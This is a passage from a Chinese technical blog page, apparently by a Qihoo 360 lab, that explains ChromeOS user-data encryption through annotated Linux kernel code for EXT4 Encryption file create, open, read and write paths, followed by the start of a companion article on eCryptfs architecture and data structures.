<span class="keyword">if</span> (ci == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOKEY;</span><br><span class="line">	ctx.format = EXT4_ENCRYPTION_CONTEXT_FORMAT_V1;</span><br><span class="line">	<span class="keyword">if</span> (DUMMY_ENCRYPTION_ENABLED(EXT4_SB(parent-&gt;i_sb))) &#123;</span><br><span class="line">		ctx.contents_encryption_mode = EXT4_ENCRYPTION_MODE_AES_256_XTS;</span><br><span class="line">		ctx.filenames_encryption_mode =</span><br><span class="line">			EXT4_ENCRYPTION_MODE_AES_256_CTS;</span><br><span class="line">		ctx.flags = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">memset</span>(ctx.master_key_descriptor, <span class="number">0x42</span>,</span><br><span class="line">		       EXT4_KEY_DESCRIPTOR_SIZE);</span><br><span class="line">		res = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/*使用父目录的文件内容加密模式、文件名加密模式、master key descriptor、flags</span></span><br><span class="line"><span class="comment">	*初始化新文件的ext4_encryption_context</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">		ctx.contents_encryption_mode = ci-&gt;ci_data_mode;</span><br><span class="line">		ctx.filenames_encryption_mode = ci-&gt;ci_filename_mode;</span><br><span class="line">		ctx.flags = ci-&gt;ci_flags;</span><br><span class="line">		<span class="built_in">memcpy</span>(ctx.master_key_descriptor, ci-&gt;ci_master_key,</span><br><span class="line">		       EXT4_KEY_DESCRIPTOR_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//产生16 bytes的随机数做为新文件的nonce</span></span><br><span class="line">	get_random_bytes(ctx.nonce, EXT4_KEY_DERIVATION_NONCE_SIZE);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//将初始化好的新文件的ext4_encryption_context保存到attr中</span></span><br><span class="line">	res = ext4_xattr_set(child, EXT4_XATTR_INDEX_ENCRYPTION,</span><br><span class="line">			     EXT4_XATTR_NAME_ENCRYPTION_CONTEXT, &amp;ctx,</span><br><span class="line">			     <span class="keyword">sizeof</span>(ctx), <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!res) &#123;</span><br><span class="line">		<span class="comment">//设置新文件的inode的i_flags为EXT4_INODE_ENCRYPT</span></span><br><span class="line">		ext4_set_inode_flag(child, EXT4_INODE_ENCRYPT);</span><br><span class="line">		ext4_clear_inode_state(child, EXT4_STATE_MAY_INLINE_DATA);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*为新文件初始化好其inode对应的i_crypt_info，主要是完成其tfm的初始化</span></span><br><span class="line"><span class="comment">		*为后续的读写文件时调用kernel crypto进行加/解密做好准备</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		res = ext4_get_encryption_info(child);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<p>&emsp;  简单的说，creat时完成两件事：一是创建ext4_encryption_context保存到文件的xattr；二是初始化好ext4_crypt_info 保存到inode的i_crypt_info，后续使用时取出tfm，利用kernel crypto API即完成了加/解密工作。</p>
<h3 id="open-file流程-回页首"><a href="#open-file流程-回页首" class="headerlink" title="open file流程 回页首"></a>open file流程 <a href="#top">回页首</a></h3><p><span id="EXT4-Encryption-file-open"></span></p>
<p>&emsp;  这里open file特指打开已存在的EXT4 Encryption加密文件。仅加密部分而言，该过程相比creat少了创建ext4_encryption_context保存到文件的xattr的操作，其余部分基本一致。从应用程序调用open()函数开始到最终调用到ext4_file_open()函数的函数调用关系如上图五所示。本节主要描述ext4_file_open()函数，其函数调用关系如图七。</p>
<center>          
![](ext4_file_open.png "图七")   
图七 ext4\_file\_open函数调用关系
</center>

<p>图七所示各函数主要完成的功能如下：<br>● ext4_encrypted_inode() 判断欲打开文件对应inode的i_flags是否设置成EXT4_INODE_ENCRYPT，若是，表明是加密文件<br>● ext4_get_encryption_info() 从文件inode的xattr取出文件加密算法、文件名加密算法、master key descriptor、 随机密钥nonce；之后生成加密文件内容使用的密钥derived key并初始化好kernel crypto接口tfm，将其以ext4_crypt_info 形式保存到inode的i_crypt_info。详细代码见清单八<br>● ext4_encryption_info()确保文件对应inode在内存中的表示ext4_inode_info中的i_crypt_info已经做好初始化<br>● ext4_encrypted_inode(dir)判断判断欲打开文件的父目录inode的i_flags是否设置成EXT4_INODE_ENCRYPT<br>● ext4_is_child_context_consistent_with_parent()判断文件和其父目录的加密context是否一致，关键是master key descriptor是否一致<br>● dquost_file_open() 调用通用的文件打开函数完成其余的操作<br>&emsp;  简单的说就是在open file的时候完成文件加/解密所需的所有context。</p>
<h3 id="read-file流程-回页首"><a href="#read-file流程-回页首" class="headerlink" title="read file流程 回页首"></a>read file流程 <a href="#top">回页首</a></h3><p><span id="EXT4-Encryption-file-read"></span></p>
<p>&emsp;  加密文件的解密工作主要是在read的时候进行。正常的Linux read支持Buffered I/O和Direct I/O两种模式，Buffered I/O利用内核的page cache机制，而Direct I/O需要应用程序自身准备和处理cache，当前版本的EXT4 Encryption不支持Direct I/O，其文件内容解密工作都在page cache中完成。自应用程序发起read操作到kernel对文件内容进行解密的函数调用关系如图八所示。</p>
<center>          
![](read.png "图八")   
图八 read 加密文件的函数调用关系
</center>

<p>&emsp;  ext4 文件读的主要实现在ext4_readpage函数，文件内容的AES-256-XTS解密理所当然也在该函数里，这里主要介绍文件内容解密部分，其函数调用关系如图九所示。ext4 读写通过bio进行封装，描述块数据传送时怎样进行填充或读取块给driver，包括描述磁盘和内存的位置，其内部有一个函数指针bi_end_io，当读取完成时会回调该函数，如图九所示，ext4将bi_end_io赋值为mpage_end_io。mpage_end_io通过queue_work的形式调用completion_pages函数，在该函数中再调用ext4_decrypt函数完成page的解密。ext4_decrypt函数的代码非常简单，如清单十所示。核心的加密和解密函数都在ext4_page_crypto()中完成，因为在open file的时候已经初始化好了kernel crypto接口，所以这里主要传入表明是加密还是解密的参数以及密文页和明文页地址，代码比较简单，如清单十一所示。</p>
<center>          
![](ext4_readpage.png "图九")   
图九 ext4_readpage函数调用关系
</center>

<h4 id="清单十-ext4-decrypt函数"><a href="#清单十-ext4-decrypt函数" class="headerlink" title="清单十 ext4_decrypt函数"></a>清单十 ext4_decrypt函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ext4_decrypt</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BUG_ON(!PageLocked(page));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ext4_page_crypto(page-&gt;mapping-&gt;host, EXT4_DECRYPT,</span><br><span class="line">				page-&gt;index, page, page, GFP_NOFS);</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<h4 id="清单十一-ext4-page-crypto-函数"><a href="#清单十一-ext4-page-crypto-函数" class="headerlink" title="清单十一 ext4_page_crypto 函数"></a>清单十一 ext4_page_crypto 函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ext4_page_crypto</span><span class="params">(struct inode *inode, <span class="keyword">ext4_direction_t</span> rw, <span class="keyword">pgoff_t</span> index, struct page *src_page,</span></span></span><br><span class="line"><span class="function"><span class="params">			    struct page *dest_page, <span class="keyword">gfp_t</span> gfp_flags)</span> </span>&#123;</span><br><span class="line">	u8 xts_tweak[EXT4_XTS_TWEAK_SIZE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ablkcipher_request</span> *<span class="title">req</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	DECLARE_EXT4_COMPLETION_RESULT(ecr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">dst</span>, <span class="title">src</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ext4_crypt_info</span> *<span class="title">ci</span> = <span class="title">EXT4_I</span>(<span class="title">inode</span>)-&gt;<span class="title">i_crypt_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">crypto_ablkcipher</span> *<span class="title">tfm</span> = <span class="title">ci</span>-&gt;<span class="title">ci_ctfm</span>;</span> <span class="comment">//取出open时初始化好的tfm</span></span><br><span class="line">	<span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">	req = ablkcipher_request_alloc(tfm, gfp_flags);</span><br><span class="line">	<span class="keyword">if</span> (!req) &#123;</span><br><span class="line">		printk_ratelimited(KERN_ERR <span class="string">"%s: crypto_request_alloc() failed\n"</span>, __func__);</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	ablkcipher_request_set_callback(</span><br><span class="line">		req, CRYPTO_TFM_REQ_MAY_BACKLOG | CRYPTO_TFM_REQ_MAY_SLEEP,</span><br><span class="line">		ext4_crypt_complete, &amp;ecr);</span><br><span class="line">	BUILD_BUG_ON(EXT4_XTS_TWEAK_SIZE &lt; <span class="keyword">sizeof</span>(index));</span><br><span class="line">	<span class="built_in">memcpy</span>(xts_tweak, &amp;index, <span class="keyword">sizeof</span>(index));</span><br><span class="line">	<span class="built_in">memset</span>(&amp;xts_tweak[<span class="keyword">sizeof</span>(index)], <span class="number">0</span>, EXT4_XTS_TWEAK_SIZE - <span class="keyword">sizeof</span>(index));</span><br><span class="line"></span><br><span class="line">	sg_init_table(&amp;dst, <span class="number">1</span>);</span><br><span class="line">	sg_set_page(&amp;dst, dest_page, PAGE_CACHE_SIZE, <span class="number">0</span>);</span><br><span class="line">	sg_init_table(&amp;src, <span class="number">1</span>);</span><br><span class="line">	sg_set_page(&amp;src, src_page, PAGE_CACHE_SIZE, <span class="number">0</span>);</span><br><span class="line">	ablkcipher_request_set_crypt(req, &amp;src, &amp;dst, PAGE_CACHE_SIZE, xts_tweak);</span><br><span class="line">	<span class="keyword">if</span> (rw == EXT4_DECRYPT)</span><br><span class="line">		res = crypto_ablkcipher_decrypt(req);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		res = crypto_ablkcipher_encrypt(req);</span><br><span class="line">	<span class="keyword">if</span> (res == -EINPROGRESS || res == -EBUSY) &#123;</span><br><span class="line">		wait_for_completion(&amp;ecr.completion);</span><br><span class="line">		res = ecr.res;</span><br><span class="line">	&#125;</span><br><span class="line">	ablkcipher_request_free(req);</span><br><span class="line">	<span class="keyword">if</span> (res) &#123;</span><br><span class="line">		printk_ratelimited( KERN_ERR <span class="string">"%s: crypto_ablkcipher_encrypt() returned %d\n"</span>, __func__, res);</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<h3 id="write-file流程-回页首"><a href="#write-file流程-回页首" class="headerlink" title="write file流程 回页首"></a>write file流程 <a href="#top">回页首</a></h3><p><span id="EXT4-Encryption-file-write"></span></p>
<p>&emsp;  在写入文件的时候会首先将page cache中的文件明文内容进行AES-256-XTS<br>加密，再通过bio写入磁盘，该工作主要在ext4_writepage()函数中完成，这里主要关注EXT4 Encryption部分，其函数调用关系如图十所示。</p>
<center>          
![](ext4_writepage.png "图十")   
图十 ext4_writepage函数调用关系
</center>

<p>&emsp;  图十中，首先照例通过ext4_encrypted_inode()函数利用i_flags是否等于EXT4_INODE_ENCRYPT来判断是否是加密文件；然后使用ext4_encrypt()函数申请新的内存页用于保存密文，完成内容的加密，具体代码见清单十二，函数返回密文页的地址保存在data_page变量；紧着通过io_submit_add_bh()封装写入buffer页到磁盘的请求，这里通过判断data_page页是否空来决定是写入明文页还是密文页，巧妙的兼容了加密和非加密两种模式；最后通过ext4_io_submit()提交bio写盘请求。</p>
<h4 id="清单十二-ext4-encrypt函数"><a href="#清单十二-ext4-encrypt函数" class="headerlink" title="清单十二 ext4_encrypt函数"></a>清单十二 ext4_encrypt函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct page *<span class="title">ext4_encrypt</span><span class="params">(struct inode *inode,</span></span></span><br><span class="line"><span class="function"><span class="params">			  struct page *plaintext_page,</span></span></span><br><span class="line"><span class="function"><span class="params">			  <span class="keyword">gfp_t</span> gfp_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ext4_crypto_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">ciphertext_page</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	BUG_ON(!PageLocked(plaintext_page));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//从cache中获取一个ext4_crypto_ctx内存空间</span></span><br><span class="line">	ctx = ext4_get_crypto_ctx(inode, gfp_flags);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(ctx))</span><br><span class="line">		<span class="keyword">return</span> (struct page *) ctx;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//从内存池中申请一个内存页，命名为bounce page，用于保存密文内容，同时将</span></span><br><span class="line">	<span class="comment">//ext4_crypto_ctx的w.bounce_page指向该bounce page</span></span><br><span class="line">	<span class="comment">/* The encryption operation will require a bounce page. */</span></span><br><span class="line">	ciphertext_page = alloc_bounce_page(ctx, gfp_flags);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(ciphertext_page))</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	ctx-&gt;w.control_page = plaintext_page;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//调用kernel crypto加密，将密文保存在bounce page</span></span><br><span class="line">	err = ext4_page_crypto(inode, EXT4_ENCRYPT, plaintext_page-&gt;index,</span><br><span class="line">			       plaintext_page, ciphertext_page, gfp_flags);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		ciphertext_page = ERR_PTR(err);</span><br><span class="line">	errout:</span><br><span class="line">		ext4_release_crypto_ctx(ctx);</span><br><span class="line">		<span class="keyword">return</span> ciphertext_page;</span><br><span class="line">	&#125;</span><br><span class="line">	SetPagePrivate(ciphertext_page);</span><br><span class="line">	set_page_private(ciphertext_page, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ctx);</span><br><span class="line">	lock_page(ciphertext_page);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//返回密文页bounce page地址</span></span><br><span class="line">	<span class="keyword">return</span> ciphertext_page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<p>&emsp;  因为在open file的时候已经初始化好了kernel crypto 所需的加密算法、密钥设置，并保存了tfm到文件inode的内存表示ext4_inode_info的成员i_crypt_info中，所以在readpage/writepage时进行加/解密的操作变得很简单。</p>
<h2 id="结语-回页首"><a href="#结语-回页首" class="headerlink" title="结语 回页首"></a>结语 <a href="#top">回页首</a></h2><p><span id="end"></span></p>
<p>&emsp;  与eCryptfs类似，EXT4 Encryption建立在内核安全可信的基础上，核心安全组件是master key，若内核被攻破导致密钥泄露，EXT4 Encryption的安全性将失效。同样需要注意page cache中的明文页有可能被交换到磁盘的swap区。早期版本的Chrome OS禁用了swap功能，当前版本的swap采取的是zram机制，与传统的磁盘swap有本质区别。相比eCryptfs做为一个独立的内核加密模块，现在EXT4 Encryption原生的存在于EXT4文件系统中，在使用的便利性和性能上都优于eCryptfs，相信推广将会变得更加迅速。</p>
<h2 id="参考资料-回页首"><a href="#参考资料-回页首" class="headerlink" title="参考资料 回页首"></a>参考资料 <a href="#top">回页首</a></h2><p><span id="refer"></span></p>
<ol>
<li><a href="https://chromium.googlesource.com/chromiumos/third_party/kernel/+/v4.4.79" target="_blank" rel="noopener">Linux kernel-V4.4.79 sourcecode</a></li>
<li><a href="https://chromium.googlesource.com/chromiumos/" target="_blank" rel="noopener">Chromium OS platform-9653 sourcecode</a></li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/10/ChromeOS-Userdata-Protection-Mechanism-Based-On-EXT4-Encryption/" data-id="cmd5slqzr00040lo1abyf92ll" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2017/10/ChromeOs-Userdata-Protection-Mechanism-Based-On-eCryptfs" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2017/10/ChromeOs-Userdata-Protection-Mechanism-Based-On-eCryptfs/" class="article-date">
  <time datetime="2017-10-09T00:00:00.000Z" itemprop="datePublished">2017-10-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2017/10/ChromeOs-Userdata-Protection-Mechanism-Based-On-eCryptfs/">ChromeOS基于eCryptfs的用户数据安全保护机制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : <a href="http://weibo.com/suezi86" target="_blank">suezi(@suezi86)</a> of IceSword Lab , Qihoo 360</p>
<hr>
<p><span id="top"></span></p>
<ul>
<li><a href="#overview">概述</a></li>
<li><a href="#ecryptfs-brief">eCryptfs简介</a></li>
<li><a href="#ecryptfs-detail">eCryptfs详述</a><ul>
<li><a href="#ecryptfs-datastruct">eCryptfs相关的数据结构</a></li>
<li><a href="#ecryptfs-init">eCryptfs init过程</a></li>
<li><a href="#ecryptfs-mount">eCryptfs mount过程</a></li>
<li><a href="#ecryptfs-file-creat">加密文件creat过程</a></li>
<li><a href="#ecryptfs-file-open">加密文件open过程</a></li>
<li><a href="#ecryptfs-file-read">加密文件read过程</a></li>
<li><a href="#ecryptfs-file-write">加密文件write过程</a></li>
</ul>
</li>
<li><a href="#ecryptfs-in-chromeos">ChromeOS使用eCryptfs的方法及流程</a></li>
<li><a href="#end">结语</a></li>
<li><a href="#refer">参考资料</a></li>
</ul>
<h2 id="概述-回页首"><a href="#概述-回页首" class="headerlink" title="概述 回页首"></a>概述 <a href="#top">回页首</a></h2><p><span id="overview"></span></p>
<p>&emsp;  Chromebook的使用场景模式是允许多人分享使用同一台设备，但是同时也要保护每个用户数据的私密性，使得每个使用者都不允许访问到对方的隐私数据，包括：账户信息、浏览历史记录和cache、安装的应用程序、下载的内容以及用户自主在本地产生的文本、图片、视频等。本文试图从较高的角度阐述ChromeOS是如何通过eCryptfs机制保护用户数据隐私。</p>
<h2 id="eCryptfs简介-回页首"><a href="#eCryptfs简介-回页首" class="headerlink" title="eCryptfs简介 回页首"></a>eCryptfs简介 <a href="#top">回页首</a></h2><p><span id="ecryptfs-brief"></span></p>
<p>&emsp;  eCryptfs在Linux kernel 2.6.19由IBM公司的Halcrow，Thompson等人引入，在Cryptfs的基础上实现，用于企业级的文件系统加密，支持文件名和文件内容的加密。本质上eCryptfs 就像是一个内核版本的 Pretty Good Privacy（PGP）服务，插在 VFS和下层物理文件系统之间，充当一个“过滤器”的角色。用户应用程序对加密文件的写请求，经系统调用层到达 VFS 层，VFS 转给 eCryptfs 文件系统组件处理，处理完毕后，再转给下层物理文件系统；读请求流程则相反。<br>&emsp;  eCryptfs 的设计受到OpenPGP规范的影响，核心思想：eCryptfs通过一种对称密钥加密算法来加密文件的内容或文件名，如AES-128，密钥 FEK（File Encryption Key）随机产生。而FEK通过用户口令或者公钥进行保护，加密后的FEK称EFEK（Encrypted File Encryption Key），口令/公钥称为 FEFEK（File Encryption Key Encryption Key）。在保存文件时，将包含有EFEK、加密算法等信息的元数据（metadata）放置在文件的头部或者xattr扩展属性里（本文默认以前者做为讲解），打开文件前再解析metadata。    </p>
<center>          
![](ecryptfs-framework.png "图一")   
图一 eCryptfs的系统架构
</center>

<p>&emsp;  eCryptfs的系统架构如图一所示，eCryptfs堆叠在EXT4文件系统之上，工作时需要用户程序和内核同时配合，用户程序主要负责获取密钥并通过(add_key/keyctl/request_key)系统调用传送到内核的keyring，当某个应用程序发起对文件的读写操作前，由eCryptfs对其进行加/解密，加/解密的过程中需要调用Kernel的Crypto API（AES/DES etc）来完成。以对目录eCryptfs-test进行加密为例，为方便起见，在Ubuntu系统下测试eCryptfs的建立流程，如图二所示，通过mount指令发起eCryptfs的建立流程，然后在用户应用程序eCryptfs-utils的辅助下输入用于加密FEK的用户口令及选择加密算法等，完成挂载后意味着已经开始对测试目录eCryptfs-test的所有内容进行加密处理。测试中在eCryptfs-test目录下增加需要加密的文件或目录的内容，当用户umount退出对eCryptfs-test目录的挂载后再次查看该目录时，发现包括文件名和文件内容都进行了加密，如图三所示。</p>
<center>          
![](eCryptfs-demo-setup.png "图二")   
图二   eCryptfs使用时的建立流程

<p><img src="/2017/10/ChromeOs-Userdata-Protection-Mechanism-Based-On-eCryptfs/eCryptfs-file-demo.png" alt title="图三"><br>图三  eCryptfs加密后的文件</p>
<p><img src="/2017/10/ChromeOs-Userdata-Protection-Mechanism-Based-On-eCryptfs/ecryptfs-encrypt-decrypt-flow.png" alt title="图四"><br>图四  eCryptfs对文件的加解密流程</p>
</center>

<p>&emsp;  实现上，eCryptfs对数据的加/解密流程如图四所示，对称密钥加密算法以块为单位进行加密/解密，如AES-128。eCryptfs 将加密文件分成多个逻辑块，称为 extent，extent 的大小可调，但是不能大于实际物理页，默认值等于物理页的大小，如32位的系统下是 4096 字节。加密文件的头部存放元数据，包括元数据长度、标志位、旗标、EFEK及相应的signature，目前元数据的最小长度为 8192 字节。加/解密开始前，首先解密FEKEK取出FEK。当读入一个 extent 中的任何部分的密文时，整个 extent 被读入 Page Cache，通过 Kernel Crypto API 进行解密；当 extent 中的任何部分的明文数据被写回磁盘时，需要加密并写回整个 extent。</p>
<h2 id="eCryptfs详述-回页首"><a href="#eCryptfs详述-回页首" class="headerlink" title="eCryptfs详述 回页首"></a>eCryptfs详述 <a href="#top">回页首</a></h2><p><span id="ecryptfs-detail"></span></p>
<p>&emsp;  eCryptfs在内核中的实现代码位于kernel/fs/ecryptfs，下面以eCryptfs使用到的关键数据结构、eCryptfs init、eCryptfs mount、file creat、file open、file read、file write的顺序分别介绍eCryptfs是如何工作。另外，eCryptfs还实现了/dev/ecryptfs的misc设备，用于内核与应用程序间的消息传递，如密钥请求与响应，属于非必选项，因此这里不对其进行介绍。</p>
<h3 id="eCryptfs相关的数据结构-回页首"><a href="#eCryptfs相关的数据结构-回页首" class="headerlink" title="eCryptfs相关的数据结构 回页首"></a>eCryptfs相关的数据结构 <a href="#top">回页首</a></h3><p><span id="ecryptfs-datastruct"></span></p>
<p>&emsp;  eCryptfs关键的数据结构包括eCryptfs 文件系统相关file、dentry、inode、superblock、file_system_type描述、auth token认证令牌描述、eCryptfs加密信息描述等。<br>&emsp;  eCryptfs文件系统相关的数据结构如清单一所示，下文将会重点介绍file_system_type中的mount函数，即ecryptfs_mount。</p>
<h4 id="清单一-eCryptfs文件系统相关的数据结构"><a href="#清单一-eCryptfs文件系统相关的数据结构" class="headerlink" title="清单一 eCryptfs文件系统相关的数据结构"></a>清单一 eCryptfs文件系统相关的数据结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ecryptfs file_system_type */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> <span class="title">ecryptfs_fs_type</span> = &#123;</span></span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line">	.name = <span class="string">"ecryptfs"</span>,</span><br><span class="line">	.mount = ecryptfs_mount,</span><br><span class="line">	.kill_sb = ecryptfs_kill_block_super,</span><br><span class="line">	.fs_flags = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* superblock private data. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_sb_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">wsi_sb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_mount_crypt_stat</span> <span class="title">mount_crypt_stat</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">backing_dev_info</span> <span class="title">bdi</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* inode private data. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> <span class="title">vfs_inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">wii_inode</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lower_file_mutex</span>;</span></span><br><span class="line">	<span class="keyword">atomic_t</span> lower_file_count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">lower_file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_crypt_stat</span> <span class="title">crypt_stat</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* dentry private data. Each dentry must keep track of a lower vfsmount too. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_dentry_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">lower_path</span>;</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_crypt_stat</span> *<span class="title">crypt_stat</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* file private data. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_file_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">wfi_file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ecryptfs_crypt_stat</span> *<span class="title">crypt_stat</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>&emsp;  eCryptfs支持对文件名（包括目录名）进行加密，因此特意使用了struct ecryptfs_filename的结构封装文件名，如清单二所示。</p>
